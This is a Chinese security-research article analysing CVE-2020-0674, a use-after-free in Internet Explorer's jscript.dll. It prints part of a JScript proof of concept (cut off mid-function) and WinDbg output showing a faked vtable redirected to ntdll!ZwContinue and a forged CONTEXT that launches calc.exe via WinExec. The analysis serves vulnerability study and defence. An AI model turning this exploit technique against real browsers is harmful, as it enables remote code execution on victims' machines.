> 原文链接: https://www.anquanke.com//post/id/205224 


# IE jscript.dll释放后重用漏洞（CVE-2020-0674）分析


                                阅读量   
                                **303885**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">4</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t016d4d03bfcf9a4dfb.jpg)](https://p1.ssl.qhimg.com/t016d4d03bfcf9a4dfb.jpg)

> 银雁冰@猎影实验室

## 前言

CVE-2020-0674是360和Google在2020年初抓到的一个IE 0day，它是一个位于jscript.dll模块的UAF(释放后重用)漏洞。最近，该漏洞的一份完整利用代码在github被公布，猎影实验室对此进行了分析。



## 漏洞成因

该漏洞的成因为：若Array.sort()被调用时传入一个比较函数，jscript内部没有将此比较函数的两个参数加入GC，导致可以在对象被释放后得到悬垂指针。笔者去年曾分析过一个此类漏洞，当时就预测此类漏洞后面还会出现。

我们一起来看一下这个漏洞的PoC：

```
&lt;script language="JScript.Compact"&gt;

var depth = 0;
var spray_size = 10000;
var spray = new Array();
var sort = new Array();
var total = new Array();

for(i = 0; i &lt; 110; i++) sort[i] = [0, 0];
for(i = 0; i &lt; spray_size; i++) spray[i] = new Object();

function uaf(untracked_1, untracked_2) `{`
    untracked_1 = spray[depth * 2];
    untracked_2 = spray[depth * 2 + 1];
if(depth &gt; 50) `{`
        spray = new Array();
        CollectGarbage();
        total.push(untracked_1);
        total.push(untracked_2);
return 0;
    `}`
    depth += 1;

00000000`075c0ad0  00000000`00000000

// 伪造的jscript!NameTbl虚表
0:011&gt; dps 00000000`056ced98 l40
00000000`056ced98  00410041`00410041
00000000`056ceda0  00410041`00410041
00000000`056ceda8  00410041`00410041
00000000`056cedb0  00410041`00410041
00000000`056cedb8  00410041`00410041
00000000`056cedc0  00410041`00410041
00000000`056cedc8  00410041`00410041
00000000`056cedd0  00410041`00410041
00000000`056cedd8  00410041`00410041
00000000`056cede0  00410041`00410041
00000000`056cede8  00410041`00410041
00000000`056cedf0  00410041`00410041
00000000`056cedf8  00410041`00410041
00000000`056cee00  00410041`00410041
00000000`056cee08  00410041`00410041
00000000`056cee10  00410041`00410041
00000000`056cee18  00410041`00410041
00000000`056cee20  00410041`00410041
00000000`056cee28  00410041`00410041
00000000`056cee30  00410041`00410041
00000000`056cee38  00410041`00410041
00000000`056cee40  00410041`00410041
00000000`056cee48  00410041`00410041
00000000`056cee50  00410041`00410041
00000000`056cee58  00410041`00410041
00000000`056cee60  00410041`00410041
00000000`056cee68  00410041`00410041
00000000`056cee70  00410041`00410041
00000000`056cee78  00410041`00410041
00000000`056cee80  00410041`00410041
00000000`056cee88  00410041`00410041
00000000`056cee90  00410041`00410041
00000000`056cee98  00410041`00410041
00000000`056ceea0  00410041`00410041
00000000`056ceea8  00410041`00410041
00000000`056ceeb0  00410041`00410041
00000000`056ceeb8  00410041`00410041
00000000`056ceec0  00410041`00410041
00000000`056ceec8  00410041`00410041
00000000`056ceed0  00000000`76d116e0 ntdll!ZwContinue // 虚表第 28 项被改写为 ntdll!ZwContinue，此处原先为 jscript!ObjEvtHandler::FPersist 函数地址
...

// 直接将一个伪造的jscript!NameTbl对象当做_CONTEXT结构体，放入rcx寄存器进行传参
0:013&gt; dt _CONTEXT 00000000`075c0a70
ntdll!_CONTEXT
   +0x000 P1Home           : 0x56ced98
   +0x008 P2Home           : 0
   +0x010 P3Home           : 0
   +0x018 P4Home           : 0
   +0x020 P5Home           : 0
   +0x028 P6Home           : 0
   +0x030 ContextFlags     : 0x100003
   +0x034 MxCsr            : 0
   +0x038 SegCs            : 0x33
   +0x03a SegDs            : 0
   +0x03c SegEs            : 0
   +0x03e SegFs            : 0
   +0x040 SegGs            : 0
   +0x042 SegSs            : 0x2b
   +0x044 EFlags           : 0x246
   +0x048 Dr0              : 0
   +0x050 Dr1              : 0
   +0x058 Dr2              : 0
   +0x060 Dr3              : 0
   +0x068 Dr6              : 0
   +0x070 Dr7              : 0
   +0x078 Rax              : 0
   +0x080 Rcx              : 0x39e9c4
   +0x088 Rdx              : 0
   +0x090 Rbx              : 0
   +0x098 Rsp              : 0x53884e0
   +0x0a0 Rbp              : 0
   +0x0a8 Rsi              : 0
   +0x0b0 Rdi              : 0
   +0x0b8 R8               : 0x40
   +0x0c0 R9               : 0
   +0x0c8 R10              : 0
   +0x0d0 R11              : 0
   +0x0d8 R12              : 0
   +0x0e0 R13              : 0
   +0x0e8 R14              : 0
   +0x0f0 R15              : 0
   +0x0f8 Rip              : 0x76c38d50
   +0x100 FltSave          : _XSAVE_FORMAT
   +0x100 Header           : [2] _M128A
   +0x120 Legacy           : [8] _M128A
   +0x1a0 Xmm0             : _M128A
   +0x1b0 Xmm1             : _M128A
   +0x1c0 Xmm2             : _M128A
   +0x1d0 Xmm3             : _M128A
   +0x1e0 Xmm4             : _M128A
   +0x1f0 Xmm5             : _M128A
   +0x200 Xmm6             : _M128A
   +0x210 Xmm7             : _M128A
   +0x220 Xmm8             : _M128A
   +0x230 Xmm9             : _M128A
   +0x240 Xmm10            : _M128A
   +0x250 Xmm11            : _M128A
   +0x260 Xmm12            : _M128A
   +0x270 Xmm13            : _M128A
   +0x280 Xmm14            : _M128A
   +0x290 Xmm15            : _M128A
   +0x300 VectorRegister   : [26] _M128A
   +0x4a0 VectorControl    : 0x410041`00410041
   +0x4a8 DebugControl     : 0x410041`00410041
   +0x4b0 LastBranchToRip  : 0x410041`00410041
   +0x4b8 LastBranchFromRip : 0x410041`00410041
   +0x4c0 LastExceptionToRip : 0x410041`00410041
   +0x4c8 LastExceptionFromRip : 0x410041`00410041

// eip 为 kernel32!WinExec
0:013&gt; u 0x76c38d50
kernel32!WinExec:
00000000`76c38d50 488bc4          mov     rax,rsp
00000000`76c38d53 48895808        mov     qword ptr [rax+8],rbx
00000000`76c38d57 55              push    rbp
00000000`76c38d58 56              push    rsi
00000000`76c38d59 57              push    rdi
00000000`76c38d5a 4881ec10010000  sub     rsp,110h
00000000`76c38d61 0fbae21f        bt      edx,1Fh
00000000`76c38d65 8bf2            mov     esi,edx

// rcx 为 WinExec 的命令行参数
0:013&gt; dc 0x39e9c4
00000000`0039e9c4  575c3a43 6f646e69 535c7377 65747379  C:\Windows\Syste
00000000`0039e9d4  5c32336d 636c6163 6578652e 00000000  m32\calc.exe....
